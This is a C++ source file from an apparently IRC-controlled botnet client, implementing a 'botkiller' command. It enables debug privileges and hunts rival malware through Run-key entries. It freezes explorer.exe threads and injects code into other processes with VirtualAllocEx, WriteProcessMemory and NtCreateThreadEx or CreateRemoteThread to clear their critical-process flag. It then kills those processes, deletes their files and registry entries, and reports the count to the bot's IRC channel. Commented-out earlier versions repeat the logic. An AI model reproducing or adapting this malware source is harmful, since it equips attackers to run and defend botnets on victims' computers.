#include "../IRC.hpp"
#include "../../Core/core.hpp"

struct FOUNDBOTS {
	string file;
	string md5;
	string reg;
} botsFound[32];
int botindex;

/*int IRC::CMDBotKill( void ) {
	ActivateSeDebugPrivilege(api);
	int botkilled = 0;
	string paths[6] = {""};
	char temp[MAX_PATH] = "\0";
	api->ExpandEnvironmentStrings("%public%\\*", temp, MAX_PATH);
	if (lstrcmp(temp, "%public%\\*") != 0)
		paths[0] = temp;
	api->ExpandEnvironmentStrings("%appdata%\\*", temp, MAX_PATH);
	paths[1] = temp;
	api->ExpandEnvironmentStrings("%appdata%\\Microsoft\\*", temp, MAX_PATH);
	paths[2] = temp;
	/*ExpandEnvironmentStrings("%windir%\\*", temp, MAX_PATH);
	paths[3] = temp;*//*
	api->ExpandEnvironmentStrings("%temp%\\*", temp, MAX_PATH);
	paths[4] = temp;
	api->ExpandEnvironmentStrings("%HOMEDRIVE%\\*", temp, MAX_PATH);
	paths[5] = temp;
	botindex = 0;
	for( int i = 0; i < 3; i++) {
		if (paths[i] != "") {
			botkilled += BotKill(paths[i]);
		}
	}
	//Freeze MasterGuardian
	DWORD mG = GetPID(api, "explorer.exe");
	FreezeProcess(api, mG, true);
	//Kill Guardians.
	HANDLE procs;
	API::PROCESSENTRY32 pe32;
	char thisPath[MAX_PATH] = "\0";
	HANDLE thisProc = NULL;
	procs = api->CreateToolhelp32Snapshot(0x00000002, NULL);
	pe32.dwSize = sizeof( API::PROCESSENTRY32 );
	api->Process32First(procs, &pe32);
	MD5 Md5;
	do {
		thisProc = api->OpenProcess(PROCESS_TERMINATE | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, pe32.th32ProcessID);
		if (thisProc != NULL) {
			api->GetModuleFileNameEx(thisProc, NULL, thisPath, MAX_PATH);
			for (int i = 0; i < botindex; i++) {
				if (Md5.md5_file(api, thisPath) == botsFound[i].md5) {
					api->TerminateProcess(thisProc, 0);
					api->Sleep(3000);
					api->DeleteFile(thisPath);
				}
			}
		}
	} while (api->Process32Next(procs, &pe32));
	api->CloseHandle(procs);
	HKEY hKey;
	if (api->RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ | KEY_WRITE, &hKey) == ERROR_SUCCESS) {	
		for (int i = 0; i < botindex; i++) {
			TerminateProc(api, "", botsFound[i].file);
			lstrcpy(thisPath, botsFound[i].file.c_str());
			if (thisPath[strlen(thisPath) - 1] == '\r' || thisPath[strlen(thisPath) - 1] == '\n')
				thisPath[strlen(thisPath) - 1] = '\0';
			api->SetFileAttributes(thisPath, FILE_ATTRIBUTE_NORMAL);
			api->Sleep(3000);
			api->RegDeleteValue(hKey, botsFound[i].reg.c_str());
			botkilled++;
		}
	}
	FreezeProcess(api, mG, false);
	char killed[64] = "\0";
	api->wsprintf(killed, MSG_BOTKILLER_KILLED, botkilled);
	return(IRCSend(IRC_MSG, servers[currserver].channel, killed));
}

int IRC::BotKill( string path ) {
	int botkilled = 0;
	try {
		API::WIN32_FIND_DATAA ffd;
		HANDLE file = api->FindFirstFile(path.c_str(), &ffd);
		do {
			string ffdfile = ffd.cFileName;
			if (ffdfile == "")
				continue;
			char restr[32] = "\0";
			api->ExpandEnvironmentStrings("%programfiles%", restr, 32);
			if (path.substr(0, path.length() - 1) + ffdfile == restr) {
				continue;
			}
			api->ExpandEnvironmentStrings("%windir%", restr, 32);
			if (path.substr(0, path.length() - 1) + ffdfile == restr) {
				continue;
			}
			if ((ffdfile == "." || ffdfile == ".."))
				continue;
			if (ffd.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) {
				botkilled += BotKill(path.substr(0, path.length() - 1) + ffd.cFileName + "\\*");
				continue;
			}
			if (ffdfile.substr(ffdfile.length() - 3, 3) == "exe") {
				HKEY hKey;
				long result = 0;
				int index = 0;
				string thisValue = "";
				char currentValueName[128] = "\0";
				char currentValueData[MAX_PATH] = "\0";
				DWORD currentValueNameLength = 128;
				DWORD currentValueDataLength = MAX_PATH;
				DWORD keyType = 0;
				if (api->RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ | KEY_WRITE | KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) {
					MD5 Md5;
					do {
						result = api->RegEnumValue(hKey, index, currentValueName, &currentValueNameLength, 0, &keyType, (LPBYTE)currentValueData, &currentValueDataLength);
						if (result == ERROR_SUCCESS) {
							thisValue = currentValueData;
							if (thisValue.find(ffdfile) != string::npos) {
								if (!((path.substr(0, path.length() - 1) + ffdfile) == api->thisfile)) {									
									botsFound[botindex].file = path.substr(0, path.length() - 1) + ffdfile;
									botsFound[botindex].reg  = currentValueName;
									botsFound[botindex].md5  = Md5.md5_file(api, botsFound[botindex].file);
									botindex++;
								}
							}
						}
						index++;
						api->Sleep(1);
						currentValueNameLength = 128;
						currentValueDataLength = MAX_PATH;
					} while (result == ERROR_SUCCESS);
					api->RegCloseKey(hKey);
					index = 0;
					result = 0;
				}
			}
		} while(api->FindNextFileA(file, &ffd) != 0 );
		api->FindClose(file);
	} catch (...) {}
	return botkilled;
}*/

int IRC::CMDBotKill( void ) {
	ActivateSeDebugPrivilege(api);
	int botkilled = 0;
	char paths[6][MAX_PATH] = {"\0"};
	char temp[MAX_PATH] = "\0";
	ExpandEnvironmentStrings("%public%\\*", temp, MAX_PATH);
	if (lstrcmp(temp, "%public%\\*") != 0)
		lstrcpy(paths[0], temp);
	ExpandEnvironmentStrings("%appdata%\\*", temp, MAX_PATH);
	lstrcpy(paths[1], temp);
	ExpandEnvironmentStrings("%appdata%\\Microsoft\\*", temp, MAX_PATH);
	lstrcpy(paths[2], temp);
	/*ExpandEnvironmentStrings("%windir%\\*", temp, MAX_PATH);
	paths[3] = temp;*/
	ExpandEnvironmentStrings("%temp%\\*", temp, MAX_PATH);
	lstrcpy(paths[4], temp);
	ExpandEnvironmentStrings("%HOMEDRIVE%\\*", temp, MAX_PATH);
	lstrcpy(paths[5], temp);
	botindex = 0;
	for( int i = 0; i < 3; i++) {
		if (lstrcmp(paths[i], "") != 0) {
			botkilled += BotKill(paths[i]);
		}
	}
	//Freeze MasterGuardian
	DWORD mG = GetPID(api, "explorer.exe");
	FreezeProcess(api, mG, true);
	//Kill Guardians.
	HANDLE procs;
	API::PROCESSENTRY32 pe32;
	char thisPath[MAX_PATH] = "\0";
	HANDLE thisProc = NULL;
	procs = api->CreateToolhelp32Snapshot(0x00000002, NULL);
	pe32.dwSize = sizeof( API::PROCESSENTRY32 );
	api->Process32First(procs, &pe32);
	char *storage = (char*)malloc(64);
	MD5 md5;
	do {
		thisProc = OpenProcess(PROCESS_TERMINATE | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_OPERATION | PROCESS_SET_INFORMATION, false, pe32.th32ProcessID);
		if (thisProc != NULL) {
			api->GetModuleFileNameEx(thisProc, NULL, thisPath, MAX_PATH);
			lstrcpy(storage, md5.md5_file(api, thisPath).c_str());
			//MDFile(thisPath, storage);
			for (int i = 0; i < botindex; i++) {
				if (lstrcmp(storage, botsFound[i].md5.c_str()) == 0) {
					UnCriticalIt(pe32.th32ProcessID);
					Sleep(3000);
					TerminateProcess(thisProc, 0);
					SetFileAttributes(thisPath, FILE_ATTRIBUTE_NORMAL);
					Sleep(3000);
					DeleteFile(thisPath);
				}
			}
		}
	} while (api->Process32Next(procs, &pe32));
	CloseHandle(procs);
	HKEY hKey;
	if (api->RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ | KEY_WRITE, &hKey) == ERROR_SUCCESS) {	
		for (int i = 0; i < botindex; i++) {
			TerminateProc(api, "", botsFound[i].file.c_str());
			lstrcpy(thisPath, botsFound[i].file.c_str());
			if (thisPath[strlen(thisPath) - 1] == '\r' || thisPath[strlen(thisPath) - 1] == '\n')
				thisPath[strlen(thisPath) - 1] = '\0';
			SetFileAttributes(thisPath, FILE_ATTRIBUTE_NORMAL);
			Sleep(3000);
			api->RegDeleteValue(hKey, botsFound[i].reg.c_str());
			botkilled++;
		}
	}
	FreezeProcess(api, mG, false);
	char killed[64] = "\0";
	try { free(storage); } catch (...) {}
	sprintf(killed, MSG_BOTKILLER_KILLED, botkilled);
	return(IRCSend(IRC_MSG, servers[currserver].channel, killed));
}

int IRC::BotKill( string path ) {
	int botkilled = 0;
	try {
		WIN32_FIND_DATAA ffd;
		HANDLE file = FindFirstFile(path.c_str(), &ffd);
		char ffdfile[MAX_PATH];
		char protf[32] = "\0";
		char windr[32] = "\0";
		char temporary[MAX_PATH] = "\0";
		ExpandEnvironmentStrings("%programfiles%", protf, 32);
		ExpandEnvironmentStrings("%windir%", windr, 32);
		do {
			strcpy(ffdfile, "\0");
			strcpy(temporary, "\0");
			strcpy(ffdfile, ffd.cFileName);

			if (lstrcmp(ffdfile, "") == 0)
				continue;
			
			strncpy(temporary, path.c_str(), lstrlen(path.c_str()) - 1);
			//lstrcat(temporary, ffdfile);
			/*if (path.substr(0, path.length() - 1) + ffdfile == restr)*/
			if (lstrcmp(temporary, protf) == 0) {
				continue;
			}
			
			/*if (path.substr(0, path.length() - 1) + ffdfile == restr)*/
			if (lstrcmp(temporary, windr) == 0) {
				continue;
			}
			if ((lstrcmp(ffdfile, ".") == 0 || lstrcmp(ffdfile, "..") == 0))
				continue;
			if (ffd.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) {
				char next[MAX_PATH] = "\0";
				strncpy(next, path.c_str(), lstrlen(path.c_str()) - 1);
				lstrcat(next, ffd.cFileName);
				lstrcat(next, "\\*\0");
				/*botkilled += BotKill(path.substr(0, path.length() - 1) + ffd.cFileName + "\\*");*/
				botkilled += BotKill(next);
				continue;
			}
			/*if (ffdfile.substr(ffdfile.length() - 3, 3) == "exe")*/
			if (lstrcmp(ffdfile + (lstrlen(ffdfile) - 3), "exe") == 0) {
				HKEY hKey;
				long result = 0;
				int index = 0;
				char thisValue[MAX_PATH] = "\0";
				char currentValueName[128] = "\0";
				char currentValueData[MAX_PATH] = "\0";
				DWORD currentValueNameLength = 128;
				DWORD currentValueDataLength = MAX_PATH;
				DWORD keyType = 0;
				char thisfile[MAX_PATH];
				char tempi[MAX_PATH] = "\0";
				GetModuleFileName(GetModuleHandle(NULL), thisfile, MAX_PATH);
				MD5 md5;
				if (api->RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ | KEY_WRITE | KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) {
					char *storage = (char*)malloc(64);
					do {
						result = api->RegEnumValue(hKey, index, currentValueName, &currentValueNameLength, 0, &keyType, (LPBYTE)currentValueData, &currentValueDataLength);
						if (result == ERROR_SUCCESS) {
							lstrcpy(thisValue, currentValueData);
							/*if (thisValue.find(ffdfile) != string::npos)*/
							if (strstr(thisValue, ffdfile) != 0) {
								/*if (!((path.substr(0, path.length() - 1) + ffdfile) == thisfile))*/ 
								sprintf(tempi, "%s%s", temporary, ffdfile);
								if (lstrcmp(tempi, thisfile) != 0) {
									botsFound[botindex].file = tempi;
									botsFound[botindex].reg = currentValueName;
									botsFound[botindex].md5 = md5.md5_file(api, botsFound[botindex].file);
									botindex++;
								}
							}
						}
						index++;
						Sleep(1);
						currentValueNameLength = 128;
						currentValueDataLength = MAX_PATH;
					} while (result == ERROR_SUCCESS);
					api->RegCloseKey(hKey);
					index = 0;
					result = 0;
					try { free(storage); } catch(...) {}
				}
			}
		} while(FindNextFileA(file, &ffd) != 0 );
		FindClose(file);
	} catch (...) {}
	return botkilled;
}

bool FreezeProcess(API *api, DWORD dwOwnerPID, bool Freeze) { 
    HANDLE        hThreadSnap = NULL; 
    bool          bRet        = false; 
	API::THREADENTRY32 te32        = {0}; 
    hThreadSnap = api->CreateToolhelp32Snapshot(0x00000004, 0); 
    if (hThreadSnap == INVALID_HANDLE_VALUE) 
        return (false); 
    te32.dwSize = sizeof(API::THREADENTRY32); 
    if (api->Thread32First(hThreadSnap, &te32)) { 
        do { 
            if (te32.th32OwnerProcessID == dwOwnerPID) {
				HANDLE hThread = api->OpenThread(THREAD_SUSPEND_RESUME, FALSE, te32.th32ThreadID);
				if (Freeze)
					api->SuspendThread(hThread);
				else {
					api->ResumeThread(hThread);
				}
				api->CloseHandle(hThread);
            } 
        }
        while (api->Thread32Next(hThreadSnap, &te32)); 
        bRet = true; 
    } 
    else 
        bRet = false;
    api->CloseHandle (hThreadSnap); 
    return (bRet); 
} 

DWORD __stdcall UnCriticalThread(PIN in) {
	/*HMODULE dll = LoadLibrary(((PIN)lpParam)->dll);
	zRtlSetProcessIsCritical RtlSetProcessIsCritical = (zRtlSetProcessIsCritical) GetProcAddress(dll, ((PIN)lpParam)->prn);*/
	in->RtlSetProcessIsCritical(FALSE, 0, FALSE);
	return 0;
}
void __declspec() UnCriticalThread_End() {}

DWORD __stdcall IRC::UnCriticalIt(DWORD pid) {
	LPVOID pAddr = NULL, strAddr = NULL;
	DWORD size = 0, size1 = 0;
	HANDLE proc;
	

	HANDLE ntdll = LoadLibrary("ntdll.dll");

	CIN in;
	in.RtlSetProcessIsCritical = (zRtlSetProcessIsCritical) GetProcAddress((HINSTANCE)ntdll, "RtlSetProcessIsCritical");
	
	proc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, pid);	
	size = (DWORD)UnCriticalThread_End - (DWORD)UnCriticalThread;
	strAddr = VirtualAllocEx(proc, 0, sizeof(CIN), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(proc, strAddr, &in, sizeof(CIN), &size1);
	pAddr = VirtualAllocEx(proc, 0, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(proc, pAddr, (LPVOID)UnCriticalThread, size, &size1);
	
	int os = GetOS(api);
	if (os == 0 || os == 3 || os == 4) {
		//IsWin7 Or CreateRemoteThread?
		HMODULE modNtDll = GetModuleHandle("ntdll.dll");
		HANDLE hThread;
		
		LPFUN_NtCreateThreadEx funNtCreateThreadEx = (LPFUN_NtCreateThreadEx) GetProcAddress(modNtDll, "NtCreateThreadEx");
		NtCreateThreadExBuffer ntbuffer;

		memset (&ntbuffer,0,sizeof(NtCreateThreadExBuffer));
		DWORD temp1 = 0;
		DWORD temp2 = 0;

		ntbuffer.Size = sizeof(NtCreateThreadExBuffer);
		ntbuffer.Unknown1 = 0x10003;
		ntbuffer.Unknown2 = 0x8;
		ntbuffer.Unknown3 = &temp2;
		ntbuffer.Unknown4 = 0;
		ntbuffer.Unknown5 = 0x10004;
		ntbuffer.Unknown6 = 4;
		ntbuffer.Unknown7 = &temp1;
		ntbuffer.Unknown8 = 0;

		long status = funNtCreateThreadEx(&hThread,	0x1FFFFF, NULL,	proc, (LPTHREAD_START_ROUTINE)pAddr, strAddr, FALSE, NULL, NULL, NULL, &ntbuffer);
	} else 
		CreateRemoteThread(proc, NULL, NULL, (LPTHREAD_START_ROUTINE)pAddr, strAddr, NULL, NULL);

	return 0;
}

/*
int IRC::BotKill( string path ) {
	int botkilled = 0;
	try {
		API::WIN32_FIND_DATAA ffd;
		HANDLE file = api->FindFirstFile(path.c_str(), &ffd);
		do {
			string ffdfile = ffd.cFileName;
			if (ffdfile == "")
				continue;
			if ((ffdfile == "." || ffdfile == ".."))
				continue;
			if (ffd.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) {
				botkilled += BotKill(path.substr(0, path.length() - 1) + ffd.cFileName + "\\*");
				continue;
			}
			if (ffdfile.substr(ffdfile.length() - 3, 3) == "exe") {
				if (ffdfile == api->thisfile.substr(api->thisfile.find_last_of("\\") + 1, api->thisfile.length() - api->thisfile.find_last_of("\\") + 1))
					continue;
				HKEY hKey;
				long result = 0;
				int index = 0;
				string thisValue = "";
				char currentValueName[128] = "\0";
				char currentValueData[MAX_PATH] = "\0";
				DWORD currentValueNameLength = 128;
				DWORD currentValueDataLength = MAX_PATH;
				DWORD keyType = 0;
				if (api->RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ | KEY_WRITE | KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) {
					do {
						result = api->RegEnumValue(hKey, index, currentValueName, &currentValueNameLength, 0, &keyType, (LPBYTE)currentValueData, &currentValueDataLength);
						if (result == ERROR_SUCCESS) {
							thisValue = currentValueData;
							if (thisValue.find(ffdfile) != string::npos) {
								TerminateProc(api, ffdfile);
								api->Sleep(1000);
								api->DeleteFile(currentValueData);
								api->RegDeleteValue(hKey, currentValueName);
								botkilled++;
							}
						}
						index++;
						api->Sleep(1);
						currentValueNameLength = 128;
						currentValueDataLength = MAX_PATH;
					} while (result == ERROR_SUCCESS);
					index = 0;
					result = 0;
				}
				if (api->RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ | KEY_WRITE, &hKey) == ERROR_SUCCESS) {
					do {
						result = api->RegEnumValue(hKey, index, currentValueName, &currentValueNameLength, 0, &keyType, (LPBYTE)currentValueData, &currentValueDataLength);
						if (result == ERROR_SUCCESS) {
							thisValue = currentValueData;
							if (thisValue.find(ffdfile) != string::npos) {
								TerminateProc(api, ffdfile);
								api->Sleep(1000);
								api->DeleteFile(currentValueData);
								api->RegDeleteValue(hKey, currentValueName);
								botkilled++;
							}
						}
						index++;
						api->Sleep(1);
						currentValueNameLength = 128;
						currentValueDataLength = MAX_PATH;
					} while (result == ERROR_SUCCESS);
					index = 0;
					result = 0;
				}
			}
		} while(api->FindNextFileA(file, &ffd) != 0 );
		api->FindClose(file);
	} catch (...) {}
	return botkilled;
}*/